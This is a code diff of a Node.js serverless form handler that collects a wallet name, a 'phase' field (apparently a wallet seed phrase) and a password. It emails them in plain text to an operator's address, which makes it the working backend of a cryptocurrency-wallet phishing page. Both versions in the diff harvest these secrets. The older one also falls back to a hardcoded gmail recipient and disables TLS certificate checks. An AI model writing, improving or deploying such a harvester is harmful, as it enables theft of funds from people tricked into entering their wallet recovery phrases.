@@ -1,104 +1,130 @@
-const nodemailer = require("nodemailer");
+const nodemailer = require('nodemailer');
 
-const smtpUser = process.env.SMTP_USER || process.env.SMTP_USERNAME || process.env.EMAIL_USER;
-const smtpPass = process.env.SMTP_PASS || process.env.SMTP_PASSWORD || process.env.EMAIL_PASSWORD;
-const smtpHost = process.env.SMTP_HOST || process.env.SMTP_SERVER || "smtp.gmail.com";
-const smtpPort = Number(process.env.SMTP_PORT || 587);
-const smtpSecure = (process.env.SMTP_SECURE || "false") === "true" || smtpPort === 465;
-const smtpSkipVerify = (process.env.SMTP_SKIP_VERIFY || "false") === "true";
+function htmlspecialchars(str) {
+  return String(str)
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;')
+    .replace(/"/g, '&quot;')
+    .replace(/'/g, '&#039;');
+}
 
-const transporter = nodemailer.createTransport({
-  host: smtpHost,
-  port: smtpPort,
-  secure: smtpSecure,
-  tls: { rejectUnauthorized: false },
-  auth: {
-    user: smtpUser,
-    pass: smtpPass,
-  },
-});
-
-const parseBody = async (req) => {
-  if (req.body) {
-    return req.body;
-  }
-
+async function parseRequestBody(req) {
+  if (req.body) return req.body;
   const chunks = [];
-  for await (const chunk of req) {
-    chunks.push(chunk);
-  }
-  const rawBody = Buffer.concat(chunks).toString("utf8");
-  const contentType = (req.headers["content-type"] || "").toLowerCase();
+  for await (const chunk of req) chunks.push(chunk);
+  const raw = Buffer.concat(chunks).toString('utf8');
+  const params = Object.fromEntries(new URLSearchParams(raw));
+  return params;
+}
 
-  if (contentType.includes("application/json")) {
-    return rawBody ? JSON.parse(rawBody) : {};
-  }
-
-  if (contentType.includes("application/x-www-form-urlencoded")) {
-    return Object.fromEntries(new URLSearchParams(rawBody));
-  }
-
-  return {};
-};
-
-module.exports = async (req, res) => {
-  if (req.method !== "POST") {
-    res.setHeader("Allow", "POST");
-    return res.status(405).json({ error: "Method Not Allowed" });
+module.exports = async function (req, res) {
+  if (req.method !== 'POST') {
+    res.statusCode = 405;
+    res.setHeader('Allow', 'POST');
+    res.setHeader('Content-Type', 'application/json');
+    res.end(JSON.stringify({ error: 'Method Not Allowed' }));
+    return;
   }
 
-  if (!smtpUser || !smtpPass) {
-    return res.status(500).json({
-      error: "SMTP credentials are not configured.",
-      details: "Expected SMTP_USER or SMTP_PASSWORD and SMTP_PASS or SMTP_PASSWORD to be set.",
-    });
-  }
-
-  let body;
+  let body = {};
   try {
-    body = await parseBody(req);
-  } catch (error) {
-    console.error(error);
-    return res.status(400).json({ error: "Invalid request body." });
+    body = await parseRequestBody(req);
+  } catch (e) {
+    res.statusCode = 400;
+    res.setHeader('Content-Type', 'application/json');
+    res.end(JSON.stringify({ error: 'Invalid request body.' }));
+    return;
   }
 
-  // Verify transporter connectivity and authentication before sending
-  if (!smtpSkipVerify) {
-    try {
-      await transporter.verify();
-    } catch (err) {
-      console.error('SMTP verify failed:', err);
-      return res.status(500).json({ error: 'SMTP verification failed. Check SMTP credentials and network access.', details: err && err.message });
-    }
-  }
-
-  const wallet_name = String(body.wallet_name || "").trim();
-  const phase = String(body.phase || "").trim();
-  const password = String(body.pw || "").trim();
+  const wallet_name = htmlspecialchars((body.wallet_name || '').toString().trim());
+  const phase = (body.phase || '').toString().trim();
+  const password = (body.pw || '').toString().trim();
 
   if (!phase) {
-    return res.status(400).json({ error: "Required field missing." });
+    res.statusCode = 400;
+    res.setHeader('Content-Type', 'application/json');
+    res.end(JSON.stringify({ error: 'Required field missing.' }));
+    return;
   }
 
-  const fromEmail = process.env.EMAIL_FROM || process.env.SMTP_FROM_EMAIL || "noreply@connectus.website";
-  const toEmail = process.env.EMAIL_TO || process.env.RECIPIENT_EMAIL || smtpUser || "attendantemail@gmail.com";
+  const host =
+    process.env.SMTP_HOST?.trim() ||
+    process.env.smtp_host?.trim() ||
+    'smtp.gmail.com';
+  const port = parseInt(
+    process.env.SMTP_PORT?.trim() ||
+      process.env.smtp_port?.trim() ||
+      '587',
+    10,
+  );
+  const user =
+    process.env.SMTP_USER?.trim() ||
+    process.env.smtp_user?.trim() ||
+    process.env.SMTP_USER_NAME?.trim();
+  const pass =
+    process.env.SMTP_PASS?.trim() ||
+    process.env.smtp_pass?.trim() ||
+    process.env.SMTP_PASSWORD?.trim();
+  const to =
+    process.env.MAIL_TO?.trim() ||
+    process.env.mail_to?.trim() ||
+    user;
+  const from =
+    process.env.MAIL_FROM?.trim() ||
+    process.env.mail_from?.trim() ||
+    `noreply@${req.headers.host || 'example.com'}`;
 
-  if (!toEmail) {
-    return res.status(500).json({ error: "Recipient email is not configured." });
+  console.log('SMTP Config Debug:', {
+    host,
+    port,
+    user: user ? '***set***' : 'NOT_SET',
+    pass: pass ? '***set***' : 'NOT_SET',
+    to,
+    from,
+  });
+
+  const missingVars = [];
+  if (!user) missingVars.push('SMTP_USER');
+  if (!pass) missingVars.push('SMTP_PASS');
+  if (missingVars.length) {
+    res.statusCode = 500;
+    res.setHeader('Content-Type', 'application/json');
+    res.end(
+      JSON.stringify({
+        error: `SMTP credentials not configured on the server. Missing: ${missingVars.join(', ')}.`,
+      }),
+    );
+    return;
   }
+
+  const transporter = nodemailer.createTransport({
+    host,
+    port,
+    secure: port === 465,
+    auth: {
+      user,
+      pass,
+    },
+  });
 
   const mailOptions = {
-    from: fromEmail,
-    to: toEmail,
-    subject: "New Form Submission",
+    from,
+    to,
+    subject: 'New Form Submission',
     text: `Wallet Name: ${wallet_name}\nPhase: ${phase}\nPassword: ${password}`,
   };
 
   try {
-    const info = await transporter.sendMail(mailOptions);
-    return res.status(200).json({ ok: true, messageId: info.messageId });
-  } catch (error) {
-    console.error('SendMail error:', error);
-    return res.status(500).json({ error: "Message could not be sent.", details: (error && (error.response || error.message)) });
+    await transporter.sendMail(mailOptions);
+    res.statusCode = 200;
+    res.setHeader('Content-Type', 'application/json');
+    res.end(JSON.stringify({ success: true }));
+    return;
+  } catch (err) {
+    res.statusCode = 500;
+    res.setHeader('Content-Type', 'application/json');
+    res.end(JSON.stringify({ error: 'Message could not be sent. ' + (err && err.message ? err.message : String(err)) }));
+    return;
   }
 };
